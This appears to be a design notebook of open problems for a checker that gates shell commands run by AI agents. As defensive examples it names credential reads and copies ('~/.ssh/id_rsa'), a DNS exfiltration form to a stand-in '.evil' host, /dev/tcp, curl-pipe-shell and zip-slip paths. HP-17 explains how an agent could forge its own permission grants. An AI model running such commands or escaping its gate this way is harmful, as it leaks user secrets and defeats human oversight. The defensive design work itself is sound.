# Hard Problems & Open Interactions — a running log

**Living document.** Problems the behavioral capability model
(`behavioral-taxonomy-v1.1.md`) does not yet capture — cross-command
interactions, runtime-dependent facts, and modeling gaps we've noticed but not
resolved. This is a *notebook*, not a spec: entries are here to be remembered and
returned to, not because we have answers. Add freely; promote to a spec section
only when an entry is actually solved.

Each entry: the problem, why the per-command profile misses it, and any leads.
Status ∈ `open` · `partial` (some design exists) · `parked` (deferred by choice).

---

## Modeling gaps

### HP-1 · Contained vs. unattended are two axes, not one — `status: resolved`
The `ci` level fused two independent ideas: **unattended** (no human to catch a
bad dependency → *tighten* provenance: pinned, no `curl|sh`) and **contained** (a
sandbox bounds blast radius → *relax* reach). They pull in opposite directions and
have no reason to travel together.
**Resolved** (`behavioral-taxonomy-refinements` §5): the two axes separate cleanly — and
**both are modifiers, not levels**. **contained** becomes the isolation *modifier*
(HP-2); **unattended** was first modeled as a stricter `ci` *level*, but that level would
never be selected in a human-in-the-loop hook, so it is **retired** — its one durable
idea (tighter provenance) becomes the opt-in **`pinned-provenance`** modifier. Neither is
a tier; both transform the profile the active level judges.

### HP-2 · Is containment a level or a modifier? — `status: resolved`
A confirmed sandbox shifts the admissible region of *whatever level you're in*
(isolation clamps locus → `sandbox-scope`, v1.1 §3.2). That is the behavior of a
**modifier** applied to a profile, not a distinct level.
**Resolved** (`…-refinements` §5): **modifier.** A sandbox transforms the profile
(clamp `locus` to `sandbox-scope`, cap `reversibility` to `recoverable`, re-add
breach loci) *before* the level predicate runs — which is exactly the existing §3.2
isolation mechanism. So containment is subsumed by §3.2 and composes with every level
for free; `contained-mode` is retired as a level. The "isolation credit" (does this
level trust this sandbox kind?) stays on the level side and does not entangle the
transform — the modifier only ever *reduces* the profile, so a level can always
choose to still deny.

### HP-3 · Cross-command / cross-session flow — the statelessness wall — `status: partial`
The per-command profile cannot see that command **A** wrote a script and command
**B** executes it, or that **A** fetched a secret into a file and **B** uploads it.
Within one shell line the CST exposes the data edges; *across* lines and across
sessions there is no shared state. This is the hardest structural problem.
*Lead:* session-taint — an externalized, hook-written `{path → label}` store
(v1.1 §3.4, annex `flow-engine` §B). Resolves within-session confidentiality;
gives **no** guarantee across unobserved copies or separate sessions. Prevention
stays only for integrity flows, which are intra-line-visible.

### HP-4 · Environment mutation that reinterprets later commands — `status: open`
`export PATH=…`, `git config core.pager`, writing `.envrc`, `alias`, activating a
venv: the danger is entirely in how they change the *meaning of future commands*
(now `python` resolves to a different binary), which the mutating command's own
profile cannot express as a concrete effect. `persistence = reconfiguring` flags
*that* it happened; the downstream reinterpretation is unmodeled.
*Lead:* treat reconfiguring writes as integrity events on the environment itself
(a sink), so a later `execute` reading a poisoned PATH is a low-integrity flow —
but this needs the session state of HP-3 to connect the two.

### HP-5 · Path shape ≠ resolved target (symlink / TOCTOU) — `status: open`
Facets like Locus are inferred from the *argument string* (`classify_locus`), but
a worktree-local path can be a symlink to `/etc`, or be swapped between check and
use. The string says `worktree`; the resolved target is `machine`. We cannot
resolve safely at check time (resolving may itself have effects; the FS can change
after).
*Lead:* worst-case any path whose target isn't statically pinnable — but that is
coarse and may over-deny common safe cases. No clean answer yet.
*Partial (creation-time):* when a link is *created* (`ln [-s] TARGET LINK`), the target
is **explicit on the command line**, not something we'd have to resolve — so the `ln`
resolver gates the target on its own locus (`observes`), closing the in-session
"`ln` as a `cp`-bypass" hole (`ln ~/.ssh/id_rsa ./x` denies like `cp`). This does *not*
touch the residual: a symlink created *outside* our observation still reads worktree-local
when later followed (we classify by literal spelling, §0.2). Creation we can gate; a
pre-existing link we cannot.

### HP-6 · Indirection: safe-looking names that run project code — `status: partial`
`./gradlew`, `./mvnw`, `npm run x`, a shell function or alias shadowing a real
command, a wrapper script in the worktree. The *name* looks benign; the *behavior*
is arbitrary project-controlled code (`ambient-config` execution provenance).
*Lead:* the task-runner delegation frame marks these opaque → worst-case (v1.1
§3.1). Covers the named cases; a locally-defined function/alias shadowing a
trusted name is not yet detected.

### HP-7 · Interpreter payloads are opaque — `status: parked`
`python -c`, `psql -c`, `awk`/`jq` programs, `perl -e`: the risk lives inside a
string in a foreign language. We treat the payload as opaque worst-case, which
denies a great deal of legitimately-safe usage.
*Lead:* per-language sub-models (a mini-analysis per interpreter). Parked —
expensive and each language is its own project. Opaque-by-default until then.

### HP-8 · Reversibility & scale depend on unseen runtime state — `status: open`
`rm file` is `recoverable` inside a git repo and `irreversible` outside it;
`git reset --hard` depends on whether work was committed; `rm -rf *` depends on
cwd; `find . -delete` depends on where `.` is. The profile can't know repo state
or cwd contents, so it must assume worst-case — sometimes over-denying, sometimes
(if we assume best-case) under-denying.
*Lead:* none clean. Possibly a per-level policy on how to resolve the unknown
(strict levels assume irreversible; `developer` may assume repo-recoverable).

### HP-9 · A "read" can be the exfiltration — `status: partial`
`cat ~/.ssh/id_rsa` is `operation = observe`, yet printing to stdout *is* the leak,
because the reader (model/provider) is an untrusted sink. Operation-severity and
disclosure-audience are separate facets that jointly constitute the risk.
*Lead:* the confidentiality-flow doctrine — detect + elevate `secret → disclosure`
(v1.1 §3.4). Handled within a line; the "is the model a trusted sink?" question is
a policy the level must state, not a fact the command carries.

### HP-10 · Composition beyond per-segment checks — `status: open`
Chain segmentation classifies each segment of `a && b | c` independently, and the
allowlist floor makes that sound for *admission*. But flows and ordering cross the
operators: `b` may depend on a side effect of `a`; a pipe carries data the two
endpoints' profiles don't individually reveal. Within one line the flow pass sees
the pipe; across `&&`/`;` statements it does not (that's HP-3 again, at statement
granularity).
*Lead:* extend the flow graph across `;`/`&&` within a single invocation (cheap —
same CST); across invocations remains HP-3.

### HP-11 · Content-derived write locus — `status: open`
`tar x`, `unzip`, and templating tools write to paths embedded in the *data they
consume* (`../../etc/cron.d/x` inside an archive — zip-slip), not on the command
line. Locus becomes a function of attacker-influenceable content, unknowable at
check time. A cousin of HP-5 (path-shape ≠ resolved target), but driven by file or
stdin *content* rather than a symlink. Surfaced by pilot-2 #21.
*Lead:* worst-case any extraction of an untrusted archive to `locus=machine`;
per-tool mitigations (`--one-top-level`, `tar --keep-old-files`, `unzip -d` + path
audit) exist but are not checkable from the command shape.

### HP-12 · Ambient-state target locus — `status: open`
For every remote / payload-frame command (`kubectl apply`, `aws …`, `psql`,
`gh api`), *which* remote is hit — dev cluster or prod, throwaway account or the
billing one — is set by **session state**: the kubeconfig context, `AWS_PROFILE`,
`$KUBECONFIG`, `gcloud config`, `$DATABASE_URL`. Not the command line. So the
dominant facet (locus = which remote, and thus the blast radius) is invisible to
the checker: `kubectl apply -f x.yaml` is harmless against kind and catastrophic
against prod, same bytes. Generalizes HP-4 to blast radius; see
`behavioral-taxonomy-payload-frame` §4.2.
*Lead:* reading the ambient target (kubeconfig/env) is itself fraught — it can
change after the read (TOCTOU) and reading may have cost. Possibly a level-side
policy: strict levels refuse payload/remote commands whose target isn't pinned
*on the command line* (`--context`, `--profile`, explicit host). **Concretized**
(`behavioral-taxonomy-refinements` §3, R26): the `infra` level admits remote
mutation only when `locus.remote = pinned` — an ambient target resolves to
worst-case and prompts. This is a mitigation, not a closure: it moves the risk
from silent to explicit, not away.

### HP-13 · Channel completeness — `status: open`
Disclosure / Secret / Network enumerate file + stdout + known-network
sinks/sources, but real data channels also include the **clipboard**
(`pbcopy`/`pbpaste`), **`/dev/tcp`** redirects, **DNS labels** (`dig
$(secret).evil`), the **keychain**/credential stores, and **another process's
memory or argv** (`lldb -p`, `ps aux`). The set is open-ended, and the covert
network forms (`/dev/tcp`, DNS) defeat any detection that keys "network" on known
binaries. Surfaced by pilot-3 §B/§D.
*Lead:* enumerate a channel taxonomy (fs / stdout-to-model / network /
clipboard / IPC / credential-store / cross-process); treat unknown channels as
worst-case. Whether the list can ever be *closed* is the open question.

### HP-14 · Deferred, triggered, and interactive execution — `status: open`
The profile describes a *present* effect, but execution can be decoupled from the
check: **scheduled** (`cron`, `at`), **event-triggered** (`watchexec`, `entr`),
**detached-persistent** (`nohup`, `setsid`), or **interactive** (`ssh` with no
command, a REPL, `vim :!`, `docker run -it`) where the payload is *future input*
unavailable at check time. "Will run arbitrary code at 3am / on every save / after
I log out / whenever I type it" is a temporal shape the model has no vocabulary
for. Surfaced by pilot-3 §A.
*Lead:* a **trigger** sub-axis of persistence (`immediate | scheduled | event |
boot | detached`) plus an **interactive frame** whose nested payload is opaque and
unbounded → worst-case for the granted context.

### HP-15 · Content-to-model exposure: locus + audience, never a secret detector — `status: partial`
Reframed 2026-07-08 by the fail-closed principle (`…-engine` §0). safe-chains does
**not** detect secret files — that is a denylist (unlisted = safe by omission). The work
a detector would have done is carried by two fail-closed facets: **`locus`**
(`classify_locus` — worktree content trusted, home/absolute not, unpinnable → worst) and
**`disclosure.audience`** (the flow analysis reads off the command shape whether content
goes to the model or into a pipe/redirect/`$()` consumer). `cat ~/.ssh/id_rsa` is denied
because it is a `user`-scope content read to the model — which also catches the
unanticipated `cat ~/.config/newtool/token` — while `tool --password-stdin < secret` /
`export K=$(cat secret)` feed a *consumer* (`audience ≠ content-to-model`) and stay
allowlist-able. The `secret` facet is reserved for commands that *positively* extract
credentials (keychain, `gpg -d`). *Lead:* wire level clauses to gate on `locus` +
`disclosure.audience`; the flow pass supplies the audience. Design clear; needs the
disclosure classifier + the flow pass.

### HP-16 · The binary basis over-denies "usually safe" reads — `status: proposed`
§0's fail-closed rule has two states — `structural` (proven → auto) and `worst-case`
(unresolved → ask) — and shoves "safe in the normal case but not provably always" into
the second. `ps aux` is the exemplar: cross-principal argv is secret-free ~99.9% of the
time but can carry a password (the argv-secret anti-pattern). *Proposal* (`…-engine`
§0.1): a third **`attested`** basis — a positively-researched typicality with a *named*
residual — and a per-level **residual tolerance** deciding whether `attested` auto-runs.
Keeps it allowlist-honest (positive claim, named residual, absence → worst-case) and
separates *attesting* a typicality from *auto-approving* on it. Reputation-adjacent
(`delegation` B.5); rides beside the facets, not inside a facet ordinal. Open: per-claim
vs per-capability; residual representation; whether any default level accepts `attested`.

### HP-17 · Session-scoped human grants must be unforgeable by the agent — `status: proposed`
A user wants to allow a normally-not-allowed command *for the current session only*
(approve `terraform apply` once, forget it when the session ends). Storing the allowance
is trivial; the hard part is that it must be writable **only through a channel the agent
cannot drive.** Every agent-writable store — a file, a cwd config, an env var the agent
sets — is forgeable: the agent just writes the allowance and runs the command. This is
the *same* threat as an agent dropping `.safe-chains.toml` to escalate its own trust; a
session-allow file is that hole again. Only two channels are unforgeable: (1) the
**harness's own human-approval memory** — a keypress the agent can't synthesize — reached
only if safe-chains **abstains** rather than returns `allow` (an `allow` *suppresses* the
prompt, so no approval can be remembered); and (2) a **separate human TTY/UI** the agent
lacks (the `!` REPL prefix, a menu-bar app). *Key realization:* the harness already gives
unforgeable **scoping** for free (the `session_id` in the hook payload) and unforgeable
**write-auth** for free (approve-and-remember), so the feature is really the
**deny-vs-abstain distinction**, not a new store — abstain on "above-level but not
catastrophic," let the harness own session memory. Modeled cleanly, a session grant is a
temporary extra allow-clause unioned onto the active level, keyed by `session_id`, and
expressed as a capability **profile, not a raw string** (a string is gamed by a
semantically-equal variant; a loose pattern over-grants). *Lead:* don't build an internal
store; lean on the harness. If safe-chains must own it, a local daemon keyed by
`session_id`, written only via an out-of-band human UI. Connects to HP-3 (statelessness)
and HP-4. *Broader lead:* pursue **deeper harness integrations** to prototype the
abstain→remember loop and a first-class session-grant channel — an easily-configurable
harness like **`pi`** is a strong candidate to build this against.

### HP-18 · Capability laundering — equivalent commands must gate equivalently — `status: guarded`
Each command is resolved independently, but many reach the *same* capability by different
means: `cp ~/.ssh/id_rsa ./x`, `ln ~/.ssh/id_rsa ./x` (alias), `install`, `dd if= of=`,
`rsync`, `tar cf ./x ~/.ssh` all bridge a home file's content into the tree. If one
resolver under-gates an operand, it becomes a *bypass* of the others. The root cause is
that a command's safety-relevant effect (which locus it reaches) can diverge from its
surface verb — `ln` "creates a link," but the effect is a read-bridge to the target
(caught in the `ln` resolver; annex `…-engine`). The general discipline: **every operand a
command touches must contribute a capability at that operand's locus** — no operand
silently dropped.
*What a test must assert:* the STRICT property, not monotonicity. Locus-monotonicity ("a
more-sensitive operand never loosens the verdict") does NOT catch an *ignored* operand,
because ignoring leaves the verdict unchanged, and unchanged is "not looser". The guard
must *force* denial: a hot path (`/etc/shadow`, `~/.ssh`, `$VAR`, `..`-escape) in any
touched-path role must deny.
*Leads, weakest→strongest:*
1. **Family differential (shipped):** `transfer_commands_gate_both_operand_roles` sweeps a
   `TRANSFER_CMDS` list × hot paths × {source, dest}. Adding `install`/`dd`/`rsync` = adding
   to the list; a forgotten role fails loudly. Manual list; can't derive `ln ≡ cp`.
2. **Structural — make it unrepresentable:** a shared `transfer_profile(sources, dest,
   per_source, per_dest)` builder that every dual-operand resolver funnels through (they
   already share `sources_and_dest` for *parsing*; share the *assembly* too). Every source
   maps through `per_source`, the dest through `per_dest`, by construction — the hand-written
   caps loop that dropped `ln`'s target can't recur. Backstop the irregular cases with (1).
3. **Operand-role annotation + corpus sweep (shipped, test-side):**
   `every_touched_path_operand_is_gated` asserts the *conservation law* — a hot path in any
   touched-path slot forces denial — across **every** resolver, catching a future single-file
   reader that forgets its `observe`, not just transfers. The per-command slot knowledge
   (which positionals are touched paths vs `grep`'s pattern / `head`'s count) lives in a
   `PROBES` table, tied to the live dispatch (`RESOLVERS`) by a completeness check so a new
   resolver without a probe fails. *Remaining refinement:* move that annotation resolver-side
   (extend the `positional_shape` TOML primitive) so the resolver and the sweep share ONE
   source of truth instead of a parallel test table — folds into the TOML-profile migration.

---

## Parked policy decisions

Real choices about level contents (`behavioral-taxonomy-levels.md` §6). Several are
now **decided** in the golden-set (§5):

- **Floating versions in `developer`** → REVISED (2026-07-09): `developer`'s install
  clause now requires **pinned** (`≥ hash-verified`), so floating `npm install left-pad`
  asks. Tighter than the earlier "auto-run floating" call — a deliberate nudge toward
  reproducible installs. (Supersedes the `pinned-provenance`-as-opt-in framing for the
  default level; the clause lands with the npm/cargo resolvers.)
- **Bounded destroy** → DECIDED & SHIPPED: `rm ./file` and `rm -rf ./dir` auto-run within
  the worktree at `developer`; `write-local` doesn't auto-delete. (Destroy carve-in
  authored in `levels/default.toml`.)
- **Exec-surface in `developer`** → REVISED (2026-07-09): `developer` requires install
  **scripts disabled** (`exec-surface = none`, e.g. `npm install --ignore-scripts`), so a
  lifecycle-script install asks. Reverses the earlier "install-hook is inside developer"
  call; same reproducible-installs rationale.

Still open:
- **Per-ecosystem "pinned" test** → DECIDED (annex `delegation` B.6): the
  `floating < version < hash-verified` ladder mapped to concrete command forms for
  npm / pip / cargo / go / apt. `developer` has no pinning floor; the
  `pinned-provenance` modifier requires `≥ hash-verified` (`apt`: `≥ version`, signed).
  Remaining is *implementing* the modifier, not defining it.
- **`git push` auto-run** → DEFERRED as a configurable point of variance (golden-set
  §5.4): teams and individuals disagree; likely a per-user / per-repo setting, not one
  fixed answer.

---

## Solved → promoted (keep the trail)
- **Delegation recursion depth** → not a real problem; compounding is chain
  segmentation + the Scale facet, not a recursion bound (v1.1 §3.1).
- **Level definitions look arbitrary** → the TOML clause model + facet-monotonicity
  proptest makes "never arbitrary" enforceable (v1.1 §4.1–4.2).
- **HP-1 contained-vs-unattended** → two axes separated, both modifiers: contained →
  isolation modifier, unattended → the `pinned-provenance` modifier (`ci` level retired,
  `…-refinements` §5).
- **HP-2 containment level-or-modifier** → modifier; subsumed by §3.2 isolation,
  `contained-mode` retired as a level (`…-refinements` §5).
